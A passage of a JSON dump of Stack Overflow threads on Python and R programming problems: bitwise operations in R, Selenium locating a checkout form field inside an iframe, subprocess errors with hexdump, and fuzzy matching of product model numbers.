dict(referer = LOGIN_URL))\n\n# Scrape url\nresult = session_requests.get(URL, headers = dict(referer = URL))\ntree = html.fromstring(result.content)\nbucket_elems = tree.findall(\".//span[@class='repo-name']\")\nbucket_names = [bucket_elem.text_content().replace(\"\\n\", \"\").strip() for bucket_elem in bucket_elems]\n\nprint bucket_names\nprint result.status_code\n\nif __name__ == '__main__':\nmain()\n</code></pre>\n"}, {"tags": ["python", "r"], "comments": [{"owner": {"reputation": 24066, "user_id": 4686625, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gsGGS.jpg?s=128&g=1", "display_name": "miradulo", "link": "https://stackoverflow.com/users/4686625/miradulo"}, "edited": false, "score": 2, "creation_date": 1463002602, "post_id": 37173663, "comment_id": 61882042, "body": "Look up Python operators in the docs, and you will find your operator name. Then google the name of this operator with &quot;r&quot; appended to it. You will find what you&#39;re looking for :)"}, {"owner": {"reputation": 412, "user_id": 3673665, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/7ac373d65bf7744c5b02f44db62c203e?s=128&d=identicon&r=PG&f=1", "display_name": "sachinv", "link": "https://stackoverflow.com/users/3673665/sachinv"}, "reply_to_user": {"reputation": 24066, "user_id": 4686625, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gsGGS.jpg?s=128&g=1", "display_name": "miradulo", "link": "https://stackoverflow.com/users/4686625/miradulo"}, "edited": false, "score": 0, "creation_date": 1463035492, "post_id": 37173663, "comment_id": 61892083, "body": "@DonkeyKong Thanks for your assistance. I updated the question but now I am struck with another issue."}, {"owner": {"reputation": 24066, "user_id": 4686625, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gsGGS.jpg?s=128&g=1", "display_name": "miradulo", "link": "https://stackoverflow.com/users/4686625/miradulo"}, "edited": false, "score": 0, "creation_date": 1463036339, "post_id": 37173663, "comment_id": 61892561, "body": "<i>Please</i> don&#39;t obfuscate your question by posting another question on top of it. Research the issue on your own, and if you are still stuck then perhaps you can come back to Stack Overflow and ask a <b>new</b> question, although I would stress that Stack Overflow is not a debugging service."}], "answers": [{"comments": [{"owner": {"reputation": 1417, "user_id": 5807425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85be6b8a565ffbf117a9ae3f1ce2d983?s=128&d=identicon&r=PG&f=1", "display_name": "jamieRowen", "link": "https://stackoverflow.com/users/5807425/jamierowen"}, "edited": false, "score": 0, "creation_date": 1463002903, "post_id": 37173741, "comment_id": 61882175, "body": "Whilst I don&#39;t mind people down voting my answers it would be nice to know why this answer is inappropriate to avoid doing so again in future"}, {"owner": {"reputation": 48227, "user_id": 1327739, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4d8209bc0fd155f340561cbf5bb9158?s=128&d=identicon&r=PG", "display_name": "lukeA", "link": "https://stackoverflow.com/users/1327739/lukea"}, "edited": false, "score": 0, "creation_date": 1463003172, "post_id": 37173741, "comment_id": 61882292, "body": "Although I didn&#39;t downvote anything I&#39;d guess some folks are missing &quot;I tried ..., but it didn&#39;t work out because...&quot;. This would also address people like me who have little experience in Python but some in R. (I think currently you are addressing only those who know borth quite well.)"}, {"owner": {"reputation": 1417, "user_id": 5807425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85be6b8a565ffbf117a9ae3f1ce2d983?s=128&d=identicon&r=PG&f=1", "display_name": "jamieRowen", "link": "https://stackoverflow.com/users/5807425/jamierowen"}, "reply_to_user": {"reputation": 48227, "user_id": 1327739, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4d8209bc0fd155f340561cbf5bb9158?s=128&d=identicon&r=PG", "display_name": "lukeA", "link": "https://stackoverflow.com/users/1327739/lukea"}, "edited": false, "score": 0, "creation_date": 1463003421, "post_id": 37173741, "comment_id": 61882380, "body": "Thanks for responding @lukeA, although I am confused by your response, is this aimed at the question or the answer?"}, {"owner": {"reputation": 48227, "user_id": 1327739, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4d8209bc0fd155f340561cbf5bb9158?s=128&d=identicon&r=PG", "display_name": "lukeA", "link": "https://stackoverflow.com/users/1327739/lukea"}, "edited": false, "score": 1, "creation_date": 1463003497, "post_id": 37173741, "comment_id": 61882415, "body": "oops, I thought this was asked by the original poster. Blame it on the gin tonic - summer is finally here in Berlin. My bad.."}, {"owner": {"reputation": 1417, "user_id": 5807425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85be6b8a565ffbf117a9ae3f1ce2d983?s=128&d=identicon&r=PG&f=1", "display_name": "jamieRowen", "link": "https://stackoverflow.com/users/5807425/jamierowen"}, "reply_to_user": {"reputation": 48227, "user_id": 1327739, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4d8209bc0fd155f340561cbf5bb9158?s=128&d=identicon&r=PG", "display_name": "lukeA", "link": "https://stackoverflow.com/users/1327739/lukea"}, "edited": false, "score": 1, "creation_date": 1463003572, "post_id": 37173741, "comment_id": 61882458, "body": "@lukeA Ha no worries, enjoy the gin and tonic."}, {"owner": {"reputation": 156564, "user_id": 324364, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/KIazX.jpg?s=128&g=1", "display_name": "joran", "link": "https://stackoverflow.com/users/324364/joran"}, "edited": false, "score": 0, "creation_date": 1463004235, "post_id": 37173741, "comment_id": 61882720, "body": "Although I also did not down vote, a more likely explanation is that some people don&#39;t appreciate it when low quality questions where the OP seemingly hasn&#39;t put in much effort quickly receive answers. They view it as reinforcing bad/rude behavior. In this case the OP clearly didn&#39;t bother even Googling &quot;bitwise and in r&quot;, which would have returned precisely your answer."}, {"owner": {"reputation": 1417, "user_id": 5807425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85be6b8a565ffbf117a9ae3f1ce2d983?s=128&d=identicon&r=PG&f=1", "display_name": "jamieRowen", "link": "https://stackoverflow.com/users/5807425/jamierowen"}, "reply_to_user": {"reputation": 156564, "user_id": 324364, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/KIazX.jpg?s=128&g=1", "display_name": "joran", "link": "https://stackoverflow.com/users/324364/joran"}, "edited": false, "score": 0, "creation_date": 1463004412, "post_id": 37173741, "comment_id": 61882796, "body": "Thank you @joran, that is at least logical."}, {"owner": {"reputation": 47307, "user_id": 817778, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/20cc8f574b01913048718f0abd4bf861?s=128&d=identicon&r=PG", "display_name": "eddi", "link": "https://stackoverflow.com/users/817778/eddi"}, "edited": false, "score": 0, "creation_date": 1463005686, "post_id": 37173741, "comment_id": 61883290, "body": "OP being lazy is a nonsensical reason for downvoting a correct answer. At least I don&#39;t see that reason listed when I hover over the downvote button."}, {"owner": {"reputation": 239591, "user_id": 1855677, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/5ufQP.png?s=128&g=1", "display_name": "IRTFM", "link": "https://stackoverflow.com/users/1855677/irtfm"}, "edited": false, "score": 0, "creation_date": 1463020648, "post_id": 37173741, "comment_id": 61887166, "body": "+1; I wasn&#39;t aware of these functions. Checking the NEWS, I see they were only added in version 3.0.0. I <i>had</i> searched for such functions at times in the past, but obviously not recently. So thanks @jamieRowen"}, {"owner": {"reputation": 412, "user_id": 3673665, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/7ac373d65bf7744c5b02f44db62c203e?s=128&d=identicon&r=PG&f=1", "display_name": "sachinv", "link": "https://stackoverflow.com/users/3673665/sachinv"}, "edited": false, "score": 0, "creation_date": 1463035620, "post_id": 37173741, "comment_id": 61892136, "body": "@jamieRowen Thanks for your response. I should have included what I had tried. That would have been good. I have updated the post with the details. Thank you"}], "tags": [], "owner": {"reputation": 1417, "user_id": 5807425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85be6b8a565ffbf117a9ae3f1ce2d983?s=128&d=identicon&r=PG&f=1", "display_name": "jamieRowen", "link": "https://stackoverflow.com/users/5807425/jamierowen"}, "is_accepted": false, "score": 2, "last_activity_date": 1463002791, "creation_date": 1463002791, "answer_id": 37173741, "question_id": 37173663, "link": "https://stackoverflow.com/questions/37173663/bitwise-and-in-r/37173741#37173741", "title": "Bitwise And in R", "body": "<p>There is a set of bitwise functions in base R. See <code>?bitwAnd</code> for the one you are looking for and others available.</p>\n"}], "owner": {"reputation": 412, "user_id": 3673665, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/7ac373d65bf7744c5b02f44db62c203e?s=128&d=identicon&r=PG&f=1", "display_name": "sachinv", "link": "https://stackoverflow.com/users/3673665/sachinv"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 271, "favorite_count": 0, "closed_date": 1463073347, "answer_count": 1, "score": -6, "last_activity_date": 1463037946, "creation_date": 1463002439, "last_edit_date": 1463037946, "question_id": 37173663, "link": "https://stackoverflow.com/questions/37173663/bitwise-and-in-r", "closed_reason": "Needs more focus", "title": "Bitwise And in R", "body": "<p>I have the below function in Python which I need to convert into R</p>\n\n<pre><code>def hamming(h1, h2):\n    h, d = 0, h1 ^ h2\n    while d:\n        h += 1\n        d &amp;= d - 1\n    return h\n</code></pre>\n\n<p>But I don't know how to handle the bitwise piece.</p>\n\n<p><strong>UPDATE:</strong> \nI had to update the question since I did a mistake of not sharing what I had done.\nI know about the BitWise operator but I was not getting the same answer. \nI should have included my code which would have not created all these confusion.</p>\n\n<p>My apologies for not been precise with the question.</p>\n\n<p>I had written the function as below:</p>\n\n<pre><code>hamming &lt;- function(h1, h2) {\n    h &lt;- 0\n    d &lt;- h1^h2\n    while (d) {\n        h &lt;- h + 1\n        d = bitwAnd(d, d-1)\n    }\n    return(h)\n}\n</code></pre>\n\n<p>But I seem to get different results from both the function. Don't know which line is wrong.</p>\n\n<p>UPDATE: I took ^ in Python to be same in R and I was wrong. I figured out the issue.\nThanks everyone</p>\n"}, {"tags": ["python", "selenium"], "comments": [{"owner": {"reputation": 2080, "user_id": 242029, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b0af6ec0e2b09283faefe2ed892d44f?s=128&d=identicon&r=PG", "display_name": "nixkuroi", "link": "https://stackoverflow.com/users/242029/nixkuroi"}, "edited": false, "score": 0, "creation_date": 1463002529, "post_id": 37173647, "comment_id": 61882013, "body": "We can&#39;t get to your URL.  Can you provide some sample code?"}, {"owner": {"reputation": 4367, "user_id": 2680978, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/e468604ee43b523912273ac69e17a3a7?s=128&d=identicon&r=PG&f=1", "display_name": "david", "link": "https://stackoverflow.com/users/2680978/david"}, "reply_to_user": {"reputation": 2080, "user_id": 242029, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b0af6ec0e2b09283faefe2ed892d44f?s=128&d=identicon&r=PG", "display_name": "nixkuroi", "link": "https://stackoverflow.com/users/242029/nixkuroi"}, "edited": false, "score": 0, "creation_date": 1463003034, "post_id": 37173647, "comment_id": 61882231, "body": "yea I updated it, for some reason it cannot find creditCardNumber by id.."}, {"owner": {"reputation": 2080, "user_id": 242029, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b0af6ec0e2b09283faefe2ed892d44f?s=128&d=identicon&r=PG", "display_name": "nixkuroi", "link": "https://stackoverflow.com/users/242029/nixkuroi"}, "edited": false, "score": 1, "creation_date": 1463003331, "post_id": 37173647, "comment_id": 61882346, "body": "Can you paste the html for the element as well?"}, {"owner": {"reputation": 8483, "user_id": 5318223, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/be47da4995eb4e8dff0ab4637e5773d6?s=128&d=identicon&r=PG&f=1", "display_name": "Kiril S.", "link": "https://stackoverflow.com/users/5318223/kiril-s"}, "edited": false, "score": 0, "creation_date": 1463004641, "post_id": 37173647, "comment_id": 61882890, "body": "Since you are clicking &quot;next&quot; button right before that, I bet you are not waiting long enough for that element to appear and become clickable. So instead of find_element_by_id, try <code>WebDriverWait(driver, 10).until(         EC. element_to_be_clickable((By.ID, &quot;creditCardNumber&quot;)).click()</code>"}, {"owner": {"reputation": 4367, "user_id": 2680978, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/e468604ee43b523912273ac69e17a3a7?s=128&d=identicon&r=PG&f=1", "display_name": "david", "link": "https://stackoverflow.com/users/2680978/david"}, "edited": false, "score": 0, "creation_date": 1463006084, "post_id": 37173647, "comment_id": 61883434, "body": "I got a timeout exception on that line, I don&#39;t think it can find by ID ?"}, {"owner": {"reputation": 4367, "user_id": 2680978, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/e468604ee43b523912273ac69e17a3a7?s=128&d=identicon&r=PG&f=1", "display_name": "david", "link": "https://stackoverflow.com/users/2680978/david"}, "edited": false, "score": 0, "creation_date": 1463006131, "post_id": 37173647, "comment_id": 61883443, "body": "you can just add to cart and click guest checkout to reach this page that I&#39;m struggling with. <a href=\"http://store.nike.com/us/en_us/pd/air-presto-ultra-flyknit-shoe/pid-10997057/pgid-11044479\" rel=\"nofollow noreferrer\">store.nike.com/us/en_us/pd/air-presto-ultra-flyknit-shoe/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 4367, "user_id": 2680978, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/e468604ee43b523912273ac69e17a3a7?s=128&d=identicon&r=PG&f=1", "display_name": "david", "link": "https://stackoverflow.com/users/2680978/david"}, "edited": false, "score": 0, "creation_date": 1463073564, "post_id": 37174801, "comment_id": 61919524, "body": "I had no idea it was inside an iframe, thanks!  However, cc.click() seems to be giving me an error."}, {"owner": {"reputation": 4367, "user_id": 2680978, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/e468604ee43b523912273ac69e17a3a7?s=128&d=identicon&r=PG&f=1", "display_name": "david", "link": "https://stackoverflow.com/users/2680978/david"}, "edited": false, "score": 0, "creation_date": 1463073856, "post_id": 37174801, "comment_id": 61919701, "body": "if i change to cc = driver.find_element_by_id(&#39;creditCarNumber&#39;),  then click works.  But how can I do what you are trying, which is to wait for element to be clickable and then click without error ?"}, {"owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "reply_to_user": {"reputation": 4367, "user_id": 2680978, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/e468604ee43b523912273ac69e17a3a7?s=128&d=identicon&r=PG&f=1", "display_name": "david", "link": "https://stackoverflow.com/users/2680978/david"}, "edited": false, "score": 0, "creation_date": 1463149393, "post_id": 37174801, "comment_id": 61956242, "body": "@david okay, but what happens now if you do <code>cc = wait.until(EC.element_to_be_clickable((By.ID, &quot;creditCardNumber&quot;))</code> and then do <code>cc.click()</code>?"}, {"owner": {"reputation": 4367, "user_id": 2680978, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/e468604ee43b523912273ac69e17a3a7?s=128&d=identicon&r=PG&f=1", "display_name": "david", "link": "https://stackoverflow.com/users/2680978/david"}, "edited": false, "score": 0, "creation_date": 1463410643, "post_id": 37174801, "comment_id": 62040891, "body": "Hey Alec, thanks for the help. NameError &quot;global name Select is not defined&quot;"}, {"owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "reply_to_user": {"reputation": 4367, "user_id": 2680978, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/e468604ee43b523912273ac69e17a3a7?s=128&d=identicon&r=PG&f=1", "display_name": "david", "link": "https://stackoverflow.com/users/2680978/david"}, "edited": false, "score": 0, "creation_date": 1463410683, "post_id": 37174801, "comment_id": 62040913, "body": "@david sure, add the import statement: <code>from selenium.webdriver.support.select import Select</code>."}, {"owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "reply_to_user": {"reputation": 4367, "user_id": 2680978, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/e468604ee43b523912273ac69e17a3a7?s=128&d=identicon&r=PG&f=1", "display_name": "david", "link": "https://stackoverflow.com/users/2680978/david"}, "edited": false, "score": 0, "creation_date": 1463410714, "post_id": 37174801, "comment_id": 62040933, "body": "@david what is the current state of the problem, have you managed to make it work? Thanks."}, {"owner": {"reputation": 4367, "user_id": 2680978, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/e468604ee43b523912273ac69e17a3a7?s=128&d=identicon&r=PG&f=1", "display_name": "david", "link": "https://stackoverflow.com/users/2680978/david"}, "edited": false, "score": 0, "creation_date": 1463411280, "post_id": 37174801, "comment_id": 62041320, "body": "Okay now it works with the import statement, thanks."}], "tags": [], "owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "is_accepted": true, "score": 1, "last_activity_date": 1463008763, "creation_date": 1463008763, "answer_id": 37174801, "question_id": 37173647, "link": "https://stackoverflow.com/questions/37173647/how-to-select-this-text-field-with-selenium-webdriver/37174801#37174801", "title": "How to select this text field with Selenium webdriver?", "body": "<p>The payment form is <em>wrapped inside an iframe element</em>. Switch to it before locating the element:</p>\n\n<pre><code>wait = WebDriverWait(driver, 10)\ndriver.switch_to.frame(\"billingFormFrame\") \n\ncc = wait.until(EC.element_to_be_clickable((By.ID, \"creditCardNumber\"))\ncc.click()\n# ...\n</code></pre>\n"}], "owner": {"reputation": 4367, "user_id": 2680978, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/e468604ee43b523912273ac69e17a3a7?s=128&d=identicon&r=PG&f=1", "display_name": "david", "link": "https://stackoverflow.com/users/2680978/david"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1123, "favorite_count": 1, "accepted_answer_id": 37174801, "answer_count": 1, "score": 1, "last_activity_date": 1463009304, "creation_date": 1463002350, "last_edit_date": 1463009304, "question_id": 37173647, "link": "https://stackoverflow.com/questions/37173647/how-to-select-this-text-field-with-selenium-webdriver", "title": "How to select this text field with Selenium webdriver?", "body": "<p>How do I select the credit card number field for a selenium webdriver test?</p>\n\n<p><a href=\"https://secure-store.nike.com/us/checkout/html/billing.jsp?_requestid=173323\" rel=\"nofollow\">https://secure-store.nike.com/us/checkout/html/billing.jsp?_requestid=173323</a></p>\n\n<pre><code>cc = driver.find_element_by_id(\"creditCardNumber\")\n</code></pre>\n\n<p>I get an unable to locate element error on this line and I have no idea why.</p>\n\n<pre><code># click next button\ndriver.find_element_by_id(\"shippingSubmit\").click()\n\n# enter credit card number\ncc = driver.find_element_by_id(\"creditCardNumber\")\ncc.click()\ncc.clear()\ncc.send_keys(\"4411111111111111\")\n\n# enter expiration\nselectmonth = Select(driver.find_element_by_id(\"expirationMonth\"))\nselectmonth.select_by_value(\"10\")\n\n# enter expiration year\nselectyear = Select(driver.find_element_by_id(\"expirationYear\"))\nselectyear.select_by_value(\"2012\")\n</code></pre>\n"}, {"tags": ["python", "loops", "subprocess", "typeerror"], "comments": [{"owner": {"reputation": 343905, "user_id": 4279, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/d92ce60d3a4cbe03598e27c2e8dee69d?s=128&d=identicon&r=PG", "display_name": "jfs", "link": "https://stackoverflow.com/users/4279/jfs"}, "edited": false, "score": 0, "creation_date": 1463003832, "post_id": 37173645, "comment_id": 61882552, "body": "1- if you want to fix the <code>TypeError</code> then ask about the <code>TypeError</code> (though the error message seems pretty clear. <a href=\"https://stackoverflow.com/posts/37173645/edit\">edit</a> your question and add the complete traceback). Thus your question might be useful to somebody else too.  If you want to know how to read a subprocess output line by line then ask about that (though there are many existing questions already). If you want to know how to hexlify a file in Python; you can ask about it too as a separate question (you don&#39;t need  to run <code>hexdump</code>) Try to limit your questions to a single issue per question."}, {"owner": {"reputation": 53, "user_id": 6226039, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/20f98b06c8cfa27c14875f1236339611?s=128&d=identicon&r=PG&f=1", "display_name": "stackofpancakes", "link": "https://stackoverflow.com/users/6226039/stackofpancakes"}, "reply_to_user": {"reputation": 343905, "user_id": 4279, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/d92ce60d3a4cbe03598e27c2e8dee69d?s=128&d=identicon&r=PG", "display_name": "jfs", "link": "https://stackoverflow.com/users/4279/jfs"}, "edited": false, "score": 0, "creation_date": 1463005639, "post_id": 37173645, "comment_id": 61883269, "body": "I can see how me having multipart question isn&#39;t ideal, but for me many of the issues tie together. While, as you say, there are other options for hexdump I am using the subprocess to perform other things beside hexdump, that was just an easy portion to convey here. I assure you I have been looking at other questions, I just simply didn&#39;t find those answers helpful for my situation so I posted my question."}, {"owner": {"reputation": 343905, "user_id": 4279, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/d92ce60d3a4cbe03598e27c2e8dee69d?s=128&d=identicon&r=PG", "display_name": "jfs", "link": "https://stackoverflow.com/users/4279/jfs"}, "edited": false, "score": 0, "creation_date": 1463006060, "post_id": 37173645, "comment_id": 61883422, "body": "there are common questions in <a href=\"http://stackoverflow.com/tags/subprocess/info\">the subprocess tag info</a>"}], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 6226039, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/20f98b06c8cfa27c14875f1236339611?s=128&d=identicon&r=PG&f=1", "display_name": "stackofpancakes", "link": "https://stackoverflow.com/users/6226039/stackofpancakes"}, "edited": false, "score": 0, "creation_date": 1463005386, "post_id": 37174023, "comment_id": 61883170, "body": "I actually did have shell=True I don&#39;t know how I missed adding that into my question. I have made your adjustments and it does seem to be properly executing now. But originally I wanted that output to go into a file as I&#39;ll have other parts of my code look at those generated files and generate additional files. I don&#39;t think i can pull the stdout shortcut later on I&#39;ll have to generate those files."}], "tags": [], "owner": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "is_accepted": true, "score": 2, "last_activity_date": 1463004172, "creation_date": 1463004172, "answer_id": 37174023, "question_id": 37173645, "link": "https://stackoverflow.com/questions/37173645/typeerror-while-looping-through-a-variable-list-of-files-with-subprocess-command/37174023#37174023", "title": "TypeError while looping through a variable list of files with subprocess commands", "body": "<p>You are close. You got the type error because <code>Popen</code> requires that you also set <code>shell=True</code> when passing in a string instead of a list. But there is another problem: <code>Popen</code> doesn't wait for the process to complete so when you read the file, there isn't anything useful in it yet. A different strategy is to skip file redirection and read the output stream directly. Note also that you don't need to use <code>enumerate</code>... the for loop gets the values in the list already. And we can skip the shell and pass the command as a list.</p>\n\n<pre><code>for hexed in fileList:\n    proc = subprocess.Popen([\"hexdump\", hexed], stdout=subprocess.PIPE,\n        stderr=open(os.devnull, 'w'))\n    for line in proc.stdout:\n        if \"statement\" in line:\n            value = \"examplevalue\"\n    proc.wait()\n    if proc.returncode != 0:\n        print('error') # need less lame error handling!   \n    if value == \"examplevalue\"\n        other subprocess statements that create a file that will again be\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 6226039, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/20f98b06c8cfa27c14875f1236339611?s=128&d=identicon&r=PG&f=1", "display_name": "stackofpancakes", "link": "https://stackoverflow.com/users/6226039/stackofpancakes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 62, "favorite_count": 0, "accepted_answer_id": 37174023, "answer_count": 1, "score": 0, "last_activity_date": 1463008338, "creation_date": 1463002341, "last_edit_date": 1463008338, "question_id": 37173645, "link": "https://stackoverflow.com/questions/37173645/typeerror-while-looping-through-a-variable-list-of-files-with-subprocess-command", "title": "TypeError while looping through a variable list of files with subprocess commands", "body": "<p>As background, I have created a list with elements of different filenames with their full path <code>(/.../filea.dat)</code> called <code>fileList</code>, it is of variable length. It has the form <code>fileList = ['/../filea.dat', '/../fileb.dat']</code>.</p>\n\n<p>I would like to execute a subprocess command on every file in that list of files, then later analyze the components of each of the files (and generated new files) separately.</p>\n\n<pre><code>for i, elem in enumerate(fileList):\n   hexed = fileList[i]\n   subprocess.Popen(\"hexdump \" + hexed + \" &gt; hexed.dat\", shell=True)\n\n   with open(\"hexed.dat\", \"r\") as f:\n      for line in f:\n         if \"statement\" in line:\n            value = \"examplevalue\"\n   if value == \"examplevalue\"\n      other subprocess statements that create a file that will again be used later\n</code></pre>\n\n<p>Right now I have a <code>TypeError: cannot concatenate 'str' and 'list' objects</code>. Let me know if I'm on the right track with this method approach as well. </p>\n\n<p>Please let me know if I need to provide additional clarification; I tried to simplify to the basics as the other details aren't important to the issue.</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463002613, "post_id": 37173628, "comment_id": 61882046, "body": "How does KDL40W705CBAEP etc.. fit into your code?"}, {"owner": {"reputation": 163, "user_id": 6261281, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/ba0278dfbabd0c26510c9640e2f9538a?s=128&d=identicon&r=PG&f=1", "display_name": "Wouter", "link": "https://stackoverflow.com/users/6261281/wouter"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463002833, "post_id": 37173628, "comment_id": 61882141, "body": "I have a text file were all the model references are in. I&#39;m pulling the models form that list. The model numbers are displayed on the site as example &#39;TV SONY KD75XD8505BAEP 75&quot; LCD EDGE LED Smart Ultra HD&#39;. In this case I have a 100% match so no problem. But when its on the site as &#39;SONY KDL-55W805 CBAEP LED TV (Flat, 55 Zoll, Full-HD, 3D, SMART TV, Android TV)&#39; than I have a problem as this isn&#39;t a 100% match"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463003387, "post_id": 37173628, "comment_id": 61882370, "body": "well there is not really enough in the text that you could even safely partially match, are you looking for particular models?"}, {"owner": {"reputation": 163, "user_id": 6261281, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/ba0278dfbabd0c26510c9640e2f9538a?s=128&d=identicon&r=PG&f=1", "display_name": "Wouter", "link": "https://stackoverflow.com/users/6261281/wouter"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463003536, "post_id": 37173628, "comment_id": 61882436, "body": "I&#39;ve been playing around with adding .replace in the item_2_name field and that works a little bit but I&#39;m looking for a 100% solution"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463003724, "post_id": 37173628, "comment_id": 61882511, "body": "Yes but there is not really enough to go on, if you had say just the same start or end strings you could match that but having arbitrary  matches all over the string does not give you the ability to match 100 percent as there is too much ambiguity, what from your file should match  <code>KDL-55W805 </code>?"}, {"owner": {"reputation": 163, "user_id": 6261281, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/ba0278dfbabd0c26510c9640e2f9538a?s=128&d=identicon&r=PG&f=1", "display_name": "Wouter", "link": "https://stackoverflow.com/users/6261281/wouter"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463004054, "post_id": 37173628, "comment_id": 61882644, "body": "KDL-55W805 needs to match KDL55W805CAEP. I found a partial solution by using &quot;.replace(&quot;-&quot;,&quot;&quot;).replace(&quot; C&quot;,&quot;C&quot;).replace(&quot; B&quot;,&quot;B&quot;)&quot;. This helps me with KD-55W805 CAEP for example. The only one I&#39;m still struggeling with is when there is no CAEP"}, {"owner": {"reputation": 159774, "user_id": 2141635, 